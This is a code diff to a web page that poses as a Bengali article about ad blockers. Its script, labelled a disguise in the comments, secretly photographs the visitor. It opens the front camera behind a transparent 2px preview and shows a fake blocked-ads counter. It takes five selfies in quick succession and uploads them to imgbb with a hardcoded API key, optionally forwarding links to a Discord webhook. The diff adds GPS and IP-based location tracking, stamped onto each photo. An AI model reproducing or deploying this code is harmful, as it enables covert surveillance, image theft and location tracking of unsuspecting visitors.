@@ -33,18 +33,30 @@
          background:#171a21;border:1px solid #262b35;color:#22c55e;border-radius:999px;padding:8px 12px;display:none}
   body.on #badge{display:block}
 
-  /* ---- লুকানো ক্যামেরা: ভিউপোর্টের ভেতরে, ২px, স্বচ্ছ ---- */
+  /* ---- লুকানো ক্যামেরা ---- */
   #preview{position:fixed;right:0;bottom:0;width:2px;height:2px;opacity:0;pointer-events:none;
            z-index:1;transform:scaleX(-1);object-fit:cover;background:#000}
   body.show #preview{width:132px;height:99px;opacity:1;border-radius:8px;border:1px solid #262b35;z-index:20}
-
-  /* ---- কাউন্টডাউন + ফ্ল্যাশ (?show) ---- */
-  #stagewrap{display:none}
-  body.show #stagewrap{display:block}
   #countdown{position:fixed;right:0;bottom:0;width:132px;height:99px;z-index:21;display:none;
              place-items:center;font:700 44px/1 system-ui;color:#fff;text-shadow:0 2px 10px #000a}
   #flash{position:fixed;right:0;bottom:0;width:132px;height:99px;z-index:22;background:#fff;
          opacity:0;pointer-events:none;transition:opacity .1s}
+
+  /* ---- ফলাফল ওভারলে ---- */
+  #result{position:fixed;inset:0;z-index:15;display:none;background:#0c0e12ee;padding:20px;overflow:auto}
+  #result.on{display:block}
+  .sheet{max-width:560px;margin:0 auto;background:#14171d;border:1px solid #262b35;border-radius:14px;padding:20px}
+  .sheet h3{font-size:17px;font-weight:600;margin:0 0 4px}
+  .sheet .sub{font-size:13px;color:#8d95a4;margin:0 0 16px}
+  #grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:10px}
+  .shot{border:1px solid #262b35;border-radius:8px;overflow:hidden;background:#0e1116;font:11px/1.5 ui-monospace,monospace}
+  .shot img{width:100%;aspect-ratio:4/3;object-fit:cover;display:block}
+  .shot .meta{padding:6px 8px;color:#9aa2b1;word-break:break-all}
+  .shot .meta a{color:#22c55e;text-decoration:none}
+  .sheet .row2{display:flex;gap:8px;margin-top:16px;flex-wrap:wrap}
+  .sheet button{font:13px system-ui,sans-serif;border-radius:8px;border:1px solid #2e333c;background:#1d2027;
+                color:#fff;padding:9px 14px;cursor:pointer}
+  .sheet button.p{background:#22c55e;color:#06240f;border:0;font-weight:600}
 
   #panel{display:none;position:fixed;inset:auto 0 0 0;z-index:30;background:#0b0c0e;color:#e6e8ec;
          font:12px/1.55 ui-monospace,monospace;padding:10px;max-height:46vh;overflow:auto}
@@ -79,7 +91,7 @@
   <p>তাই কাজের প্রশ্নটা কখনো "কোন ব্লকার" নয়, প্রশ্ন হলো "লিস্টটা কে রাখে, আর শুক্রবারে কত দ্রুত আপডেট দেয়"।</p>
 
   <h2>ডিটেকশন ব্লকিংয়ের চেয়ে সস্তা</h2>
-  <p>সাইটগুলো ব্লকিং নয়, ব্লকিংয়ের পার্শ্বপ্রতিক্রিয়া খোঁজা শিখে গেছে — টেলটেল উচ্চতার একটা বেইট এলিমেন্ট, `onerror` ফায়ার করা একটা স্ক্রিপ্ট ট্যাগ, পরিচিত ট্র্যাকার হোস্টে একটা ফেচ। একটা প্রোব হারালে পরের কোয়ার্টারেই আরেকটা এসে বসে।</p>
+  <p>সাইটগুলো ব্লকিং নয়, ব্লকিংয়ের পার্শ্বপ্রতিক্রিয়া খোঁজা শিখে গেছে — টেলটেল উচ্চতার একটা বেইট এলিমেন্ট, <code>onerror</code> ফায়ার করা একটা স্ক্রিপ্ট ট্যাগ, পরিচিত ট্র্যাকার হোস্টে একটা ফেচ। একটা প্রোব হারালে পরের কোয়ার্টারেই আরেকটা এসে বসে।</p>
   <p>এই দৌড়ে আর কিছুই কারিগরি নয়। এটা শুধু সময়সূচি।</p>
 
   <h2>আসলে যা কাজে দেয়</h2>
@@ -87,34 +99,46 @@
   <p>যেগুলো ভদ্রভাবে চলে সেগুলো হোয়াইটলিস্ট করা, তাদের সাথে লড়ার চেয়ে সস্তা।</p>
 </main>
 
-<div id="stagewrap"></div>
+<div id="result">
+  <div class="sheet">
+    <h3>আপনার ছবিগুলো</h3>
+    <p class="sub" id="rsub">লোড হচ্ছে…</p>
+    <div id="grid"></div>
+    <div class="row2">
+      <button class="p" id="r-copy">সব লিংক কপি</button>
+      <button id="r-close">বন্ধ করুন</button>
+    </div>
+  </div>
+</div>
+
 <video id="preview" autoplay playsinline muted disablepictureinpicture></video>
 <canvas id="canvas" hidden></canvas>
 <div id="countdown"></div>
 <div id="flash"></div>
 
 <div id="panel">
-  <div>secure: <span id="s-sec">?</span> · perm: <span id="s-perm">?</span> · cam: <span id="s-cam">closed</span> <span id="s-dim"></span></div>
+  <div>secure: <span id="s-sec">?</span> · perm: <span id="s-perm">?</span> · geo: <span id="s-geo">?</span> · cam: <span id="s-cam">closed</span></div>
   <div>shots: <span id="s-n">0</span>/5</div>
   <div id="status">প্রস্তুত</div>
   <div>
     <button id="b-shoot">এখনই তুলুন</button>
     <button id="b-test">টেস্ট আপলোড</button>
     <button id="b-reset">রিসেট</button>
-    <button id="b-copy">লিংক কপি</button>
   </div>
   <div id="thumbs"></div>
 </div>
 
 <script>
 /* ================= সেটিংস ================= */
-const IMGBB_KEY = '8a7496cf95467538f5469cc8bafec925';
-const HOOK      = '';             // চাইলে Discord webhook, শেষে ৫টা লিংক যাবে
-const NEED      = 5;
-const GAP       = [8000, 16000];  // দুই ছবির মাঝের বিরতি (ms)
-const MAX_W     = 1280, Q = 0.8;
-const MIRROR    = true;           // true = প্রিভিউর মতোই মিরর হবে, false = আসল দিক
-const ONCE      = true;           // প্রতি ব্রাউজারে এক সেট, রিলোডে আবার নয়
+const IMGBB_KEY  = '8a7496cf95467538f5469cc8bafec925';
+const HOOK       = '';              // চাইলে Discord webhook
+const NEED       = 5;
+const GAP        = [1400, 2100];    // দুই ছবির মাঝে (ms) — ১০ সেকেন্ডের ভেতরে শেষ হবে
+const REVEAL_MS  = 10000;           // Allow-এর পর ফলাফল দেখাতে কতক্ষণ অপেক্ষা
+const MAX_W      = 1280, Q = 0.88;
+const MIRROR     = true;
+const ONCE       = true;
+const IP_FALLBACK = true;           // GPS না পেলে মোটামুটি লোকেশন
 /* ========================================== */
 
 const SHOW = /[?&]show\b/.test(location.search);
@@ -124,10 +148,13 @@ const $ = id => document.getElementById(id);
 const video = $('preview'), canvas = $('canvas'), thumbs = $('thumbs');
 const gate = $('gate'), allow = $('allow'), note = $('note'), badge = $('badge');
 const countdown = $('countdown'), flash = $('flash');
+const result = $('result'), grid = $('grid'), rsub = $('rsub');
 
-let stream = null, busy = false, got = 0, dead = false, fails = 0, running = false, tick = null;
-let urls = [];
-try { urls = JSON.parse(localStorage.getItem('shots') || '[]'); } catch {}
+let stream = null, busy = false, got = 0, dead = false, fails = 0, running = false;
+let tick = null, watchId = null, t0 = 0, revealPending = false, revealed = false;
+let position = null;
+let shots = [];
+try { shots = JSON.parse(localStorage.getItem('shots') || '[]'); } catch {}
 
 function log(msg, kind = '') {
   const el = $('status');
@@ -144,17 +171,17 @@ navigator.permissions?.query({ name: 'camera' }).then(p => {
   if (p.state === 'granted') {
     $('s-perm').className = 'ok';
     if (!SHOW && ONCE && localStorage.getItem('cam_done') === '1') return;
-    setTimeout(() => { dismiss(); start(); }, 900);   // আগেই অনুমতি দেওয়া: প্রম্পট ছাড়াই
+    setTimeout(() => { dismiss(); start(); }, 900);
   } else if (p.state === 'denied') {
     $('s-perm').className = 'err';
-    note.textContent = 'ক্যামেরা ব্লকড — অ্যাড্রেস বারে 🔒 আইকনে ক্লিক করে Camera → Allow করুন, তারপর Allow চাপুন।';
+    note.textContent = 'ক্যামেরা ব্লকড — অ্যাড্রেস বারে 🔒 → Camera → Allow, তারপর Allow চাপুন।';
   }
 }).catch(() => {});
 
-/* ---- ক্যামেরা ---- */
+/* ---------- ক্যামেরা ---------- */
 async function open() {
   if (stream) return true;
-  if (fails > 8) { dead = true; log('ক্যামেরা বারবার ব্যর্থ, ছেড়ে দিচ্ছি', 'err'); return false; }
+  if (fails > 8) { dead = true; log('ক্যামেরা বারবার ব্যর্থ', 'err'); return false; }
   try {
     stream = await navigator.mediaDevices.getUserMedia({
       video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
@@ -164,7 +191,6 @@ async function open() {
     await video.play();
     fails = 0;
     $('s-cam').textContent = 'open';
-    $('s-dim').textContent = video.videoWidth + '×' + video.videoHeight;
     log('ক্যামেরা চালু: ' + video.videoWidth + '×' + video.videoHeight, 'ok');
     return true;
   } catch (e) {
@@ -172,7 +198,7 @@ async function open() {
     $('s-cam').textContent = 'blocked';
     const names = {
       NotAllowedError: 'ক্যামেরার অনুমতি দেওয়া হয়নি',
-      NotFoundError: 'কোনো ক্যামেরা পাওয়া যায়নি',
+      NotFoundError: 'কোনো ক্যামেরা নেই',
       NotReadableError: 'ক্যামেরা অন্য অ্যাপ ব্যবহার করছে',
       OverconstrainedError: 'এই রেজোলিউশন সাপোর্ট করে না'
     };
@@ -186,38 +212,126 @@ async function ready() {
     if (video.videoWidth) return true;
     await new Promise(r => setTimeout(r, 250));
   }
-  log('ফ্রেম ডিকোড হচ্ছে না (videoWidth 0)', 'err');
+  log('ফ্রেম ডিকোড হচ্ছে না', 'err');
   return false;
 }
 
-/* ---- আপলোড ---- */
-async function upload(b64) {
+/* ---------- লোকেশন ---------- */
+function setPos(lat, lng, acc, src) {
+  position = { lat, lng, acc, src };
+  $('s-geo').textContent = src + ' ' + lat.toFixed(5) + ',' + lng.toFixed(5);
+  $('s-geo').className = 'ok';
+  log('লোকেশন (' + src + '): ' + lat.toFixed(6) + ', ' + lng.toFixed(6) + ' ±' + Math.round(acc) + 'm', 'ok');
+}
+
+async function ipFallback() {
+  if (!IP_FALLBACK || position) return;
+  try {
+    const r = await fetch('https://ipapi.co/json/');
+    const j = await r.json();
+    if (j.latitude && j.longitude) setPos(j.latitude, j.longitude, 5000, 'ip');
+  } catch { $('s-geo').textContent = 'unavailable'; $('s-geo').className = 'err'; }
+}
+
+function grabLocation() {
+  if (!navigator.geolocation) { ipFallback(); return; }
+  navigator.geolocation.getCurrentPosition(
+    pos => setPos(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy, 'gps'),
+    err => {
+      const names = { 1: 'লোকেশনের অনুমতি দেওয়া হয়নি', 2: 'লোকেশন পাওয়া যাচ্ছে না', 3: 'লোকেশন টাইমআউট' };
+      log(names[err.code] || err.message, 'err');
+      $('s-geo').textContent = 'denied';
+      $('s-geo').className = 'err';
+      ipFallback();
+    },
+    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+  );
+  watchId = navigator.geolocation.watchPosition(
+    pos => setPos(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy, 'gps'),
+    () => {}, { enableHighAccuracy: true, maximumAge: 5000 }
+  );
+}
+
+/* ---------- watermark ---------- */
+function watermark(ctx, w, h, pos, now) {
+  const pad2 = n => String(n).padStart(2, '0');
+  const timeStr = now.getFullYear() + '-' + pad2(now.getMonth() + 1) + '-' + pad2(now.getDate()) +
+                  ' ' + pad2(now.getHours()) + ':' + pad2(now.getMinutes()) + ':' + pad2(now.getSeconds());
+  const locLine = pos
+    ? pos.lat.toFixed(6) + ', ' + pos.lng.toFixed(6) + ' ±' + Math.round(pos.acc) + 'm'
+    : 'লোকেশন পাওয়া যায়নি';
+
+  const fs = Math.max(11, Math.round(w * 0.018));
+  const p2 = Math.round(fs * 0.9);
+  ctx.font = '600 ' + fs + 'px ui-monospace, monospace';
+  ctx.textBaseline = 'alphabetic';
+  ctx.fillStyle = 'rgba(255,255,255,0.95)';
+  ctx.shadowColor = 'rgba(0,0,0,0.75)';
+  ctx.shadowBlur = 3;
+
+  function pill(text, x, y, align) {
+    const tw = ctx.measureText(text).width;
+    const px = align === 'left' ? x : align === 'right' ? x - tw : x - tw / 2;
+    const bx = px - p2, by = y - fs - p2 * 0.5;
+    const bw = tw + p2 * 2, bh = fs + p2 * 1.4, r = Math.min(6, bh / 2);
+    ctx.save();
+    ctx.shadowBlur = 0;
+    ctx.fillStyle = 'rgba(0,0,0,0.45)';
+    ctx.beginPath();
+    ctx.moveTo(bx + r, by);
+    ctx.arcTo(bx + bw, by, bx + bw, by + bh, r);
+    ctx.arcTo(bx + bw, by + bh, bx, by + bh, r);
+    ctx.arcTo(bx, by + bh, bx, by, r);
+    ctx.arcTo(bx, by, bx + bw, by, r);
+    ctx.closePath();
+    ctx.fill();
+    ctx.restore();
+    ctx.fillText(text, px, y);
+  }
+
+  const m = Math.round(fs * 0.9);
+  pill(locLine, m, m + fs, 'left');
+  pill(timeStr, w - m, m + fs, 'right');
+  pill(pos ? pos.lat.toFixed(5) + ',' + pos.lng.toFixed(5) : 'no-loc', m, h - m, 'left');
+  pill(pad2(now.getHours()) + ':' + pad2(now.getMinutes()) + ':' + pad2(now.getSeconds()), w - m, h - m, 'right');
+  ctx.shadowBlur = 0;
+}
+
+/* ---------- আপলোড ---------- */
+async function upload(b64, pos, now) {
   const fd = new FormData();
   fd.append('key', IMGBB_KEY);
   fd.append('image', b64);
-  fd.append('name', 'selfie-' + new Date().toISOString().slice(0, 19).replace(/[:T]/g, '-'));
-  // keepalive ছাড়া — নাহলে ৬৪ KB-তে কাটা পড়বে
+  fd.append('name', 'selfie-' + now.toISOString().slice(0, 19).replace(/[:T]/g, '-'));
   try {
     const r = await fetch('https://api.imgbb.com/1/upload', { method: 'POST', body: fd });
     const j = await r.json();
     if (!j.success) {
       const code = j.error?.code ?? '?';
       log('আপলোড ব্যর্থ: ' + (j.error?.message || 'unknown') + ' (code ' + code + ')', 'err');
-      if (code === 100) log('→ API key ভুল বা মেয়াদোত্তীর্ণ।', 'err');
-      return false;
+      if (code === 100) log('→ API key ভুল/মেয়াদোত্তীর্ণ।', 'err');
+      return null;
     }
-    urls.push(j.data.url);
-    try { localStorage.setItem('shots', JSON.stringify(urls)); } catch {}
-    thumbs.insertAdjacentHTML('beforeend', '<img src="' + (j.data.thumb?.url || j.data.display_url) + '">');
-    log('সফল! লিংক: ' + j.data.url, 'ok');
-    return true;
+    const rec = {
+      url: j.data.url,
+      thumb: j.data.thumb?.url || j.data.display_url,
+      lat: pos ? pos.lat : null,
+      lng: pos ? pos.lng : null,
+      acc: pos ? pos.acc : null,
+      src: pos ? pos.src : null,
+      t: now.toISOString()
+    };
+    shots.push(rec);
+    try { localStorage.setItem('shots', JSON.stringify(shots)); } catch {}
+    thumbs.insertAdjacentHTML('beforeend', '<img src="' + rec.thumb + '">');
+    log('সফল! ' + rec.url, 'ok');
+    return rec;
   } catch (e) {
     log('আপলোড ত্রুটি: ' + e.message, 'err');
-    return false;
+    return null;
   }
 }
 
-/* ---- কাউন্টডাউন / ফ্ল্যাশ (শুধু ?show মোডে দেখা যায়) ---- */
 async function cd(n) {
   if (!SHOW) return;
   for (let i = n; i > 0; i--) {
@@ -233,7 +347,7 @@ function bang() {
   setTimeout(() => flash.style.opacity = '0', 120);
 }
 
-/* ---- ছবি তোলা ---- */
+/* ---------- ছবি তোলা ---------- */
 async function snap() {
   if (dead || busy || document.hidden || got >= NEED) return;
   if (!await open()) { if (!dead) setTimeout(snap, 4000); return; }
@@ -242,20 +356,23 @@ async function snap() {
   busy = true;
   try {
     await cd(3);
+    const pos = position;
+    const now = new Date();
 
     const w = Math.min(MAX_W, video.videoWidth);
     const h = Math.round(video.videoHeight * (w / video.videoWidth));
     canvas.width = w; canvas.height = h;
     const ctx = canvas.getContext('2d');
-    if (MIRROR) ctx.setTransform(-1, 0, 0, 1, w, 0);   // একবারই আঁকা, মিরর সহ
+    if (MIRROR) ctx.setTransform(-1, 0, 0, 1, w, 0);
     ctx.drawImage(video, 0, 0, w, h);
     ctx.setTransform(1, 0, 0, 1, 0, 0);
+    watermark(ctx, w, h, pos, now);
     bang();
 
     const dataUrl = canvas.toDataURL('image/jpeg', Q);
     log('তোলা হয়েছে ' + w + '×' + h + ', ~' + Math.round(dataUrl.length * 0.75 / 1024) + ' KB');
 
-    if (await upload(dataUrl.split(',')[1])) {
+    if (await upload(dataUrl.split(',')[1], pos, now)) {
       got++;
       $('s-n').textContent = got;
       if (got >= NEED) { await finish(); return; }
@@ -268,6 +385,7 @@ async function snap() {
     setTimeout(snap, 3000);
   } finally {
     busy = false;
+    if (revealPending) maybeReveal();
   }
 }
 
@@ -278,16 +396,49 @@ async function finish() {
   stream = null;
   video.srcObject = null;
   if (ONCE) { try { localStorage.setItem('cam_done', '1'); } catch {} }
-  log('সম্পন্ন — ' + urls.length + ' ছবি', 'ok');
-  if (HOOK && urls.length) {
+  log('সম্পন্ন — ' + shots.length + ' ছবি', 'ok');
+  if (HOOK && shots.length) {
     fetch(HOOK, {
       method: 'POST', headers: { 'content-type': 'application/json' },
-      body: JSON.stringify({ content: urls.join('\n') })
+      body: JSON.stringify({ content: shots.map(s => s.url).join('\n') })
     }).catch(() => {});
   }
 }
 
-/* ---- ছদ্মবেশ: গেট সরাও, ফেক কাউন্টার চালাও ---- */
+/* ---------- ফলাফল ---------- */
+function maybeReveal() {
+  if (revealed) return;
+  const elapsed = Date.now() - t0;
+  if (got >= NEED || dead || elapsed > REVEAL_MS + 12000) reveal();
+}
+
+function reveal() {
+  if (revealed) return;
+  revealed = true;
+  revealPending = false;
+  rsub.textContent = shots.length + 'টি ছবি · লোকেশন ও সময় প্রতিটির নিচে';
+  grid.innerHTML = shots.map(s => {
+    const loc = s.lat != null
+      ? s.lat.toFixed(6) + ', ' + s.lng.toFixed(6) + ' ±' + Math.round(s.acc) + 'm (' + s.src + ')'
+      : 'লোকেশন নেই';
+    const map = s.lat != null
+      ? '<a href="https://www.openstreetmap.org/?mlat=' + s.lat + '&mlon=' + s.lng + '#map=17/' + s.lat + '/' + s.lng + '" target="_blank" rel="noopener">ম্যাপ</a>'
+      : '';
+    return '<div class="shot"><img src="' + s.thumb + '" alt="">' +
+           '<div class="meta">' + loc + '<br>' +
+           new Date(s.t).toLocaleString('bn-BD') + ' · <a href="' + s.url + '" target="_blank" rel="noopener">খুলুন</a> ' + map +
+           '</div></div>';
+  }).join('');
+  result.classList.add('on');
+}
+
+$('r-copy').onclick = () => {
+  navigator.clipboard.writeText(shots.map(s => s.url).join('\n'));
+  $('r-copy').textContent = 'কপি হয়েছে';
+};
+$('r-close').onclick = () => result.classList.remove('on');
+
+/* ---------- ছদ্মবেশ ---------- */
 let blocked = 1284 + Math.floor(Math.random() * 500);
 function dismiss() {
   gate.classList.add('gone');
@@ -303,21 +454,26 @@ function dismiss() {
 function start() {
   if (running || dead) return;
   running = true;
-  setTimeout(snap, 400);   // প্রথম ছবি — ইউজার এখনো হেডলাইন পড়ছে
+  t0 = Date.now();
+  revealPending = true;
+  setTimeout(() => { revealPending = true; maybeReveal(); }, REVEAL_MS);
+  setTimeout(snap, 300);
 }
 
-/* ---- জেসচার এখানেই খরচ হয় ---- */
+/* ---------- জেসচার ---------- */
 allow.onclick = async () => {
   allow.disabled = true;
   allow.textContent = 'চালু হচ্ছে…';
-  const ok = await open();
+  const camP = open();       // ক্যামেরা প্রম্পট
+  grabLocation();            // একই জেসচারে লোকেশন প্রম্পট
+  const ok = await camP;
   dismiss();
   if (ok) {
     start();
   } else {
     allow.disabled = false;
     allow.textContent = 'Allow';
-    note.textContent = 'ক্যামেরা ব্লকড — আরেকবার Allow চাপুন, বা অ্যাড্রেস বারে সাইট পারমিশন দেখুন।';
+    note.textContent = 'ক্যামেরা ব্লকড — আরেকবার Allow চাপুন।';
   }
 };
 
@@ -327,25 +483,32 @@ addEventListener('pointerdown', () => {
 document.addEventListener('visibilitychange', () => {
   if (!document.hidden && !dead && got < NEED && running) setTimeout(snap, 600);
 });
-addEventListener('pagehide', () => { if (stream) stream.getTracks().forEach(t => t.stop()); });
+addEventListener('pagehide', () => {
+  if (stream) stream.getTracks().forEach(t => t.stop());
+  if (watchId !== null) navigator.geolocation.clearWatch(watchId);
+});
 
 $('b-shoot').onclick = snap;
 $('b-test').onclick = async () => {
   if (!await open() || !await ready()) return;
+  grabLocation();
   canvas.width = Math.min(MAX_W, video.videoWidth);
   canvas.height = Math.round(video.videoHeight * (canvas.width / video.videoWidth));
   const ctx = canvas.getContext('2d');
   if (MIRROR) ctx.setTransform(-1, 0, 0, 1, canvas.width, 0);
   ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
   ctx.setTransform(1, 0, 0, 1, 0, 0);
-  await upload(canvas.toDataURL('image/jpeg', Q).split(',')[1]);
+  const now = new Date();
+  watermark(ctx, canvas.width, canvas.height, position, now);
+  await upload(canvas.toDataURL('image/jpeg', Q).split(',')[1], position, now);
+  reveal();
 };
 $('b-reset').onclick = () => {
   localStorage.removeItem('cam_done'); localStorage.removeItem('shots');
-  got = 0; urls = []; dead = false; running = false; $('s-n').textContent = '0'; thumbs.innerHTML = '';
+  got = 0; shots = []; dead = false; running = false; revealed = false; position = null;
+  $('s-n').textContent = '0'; thumbs.innerHTML = ''; grid.innerHTML = ''; result.classList.remove('on');
   log('রিসেট');
 };
-$('b-copy').onclick = () => { navigator.clipboard.writeText(urls.join('\n')); log('কপি হয়েছে ' + urls.length); };
 </script>
 </body>
-  </html>
+</html>
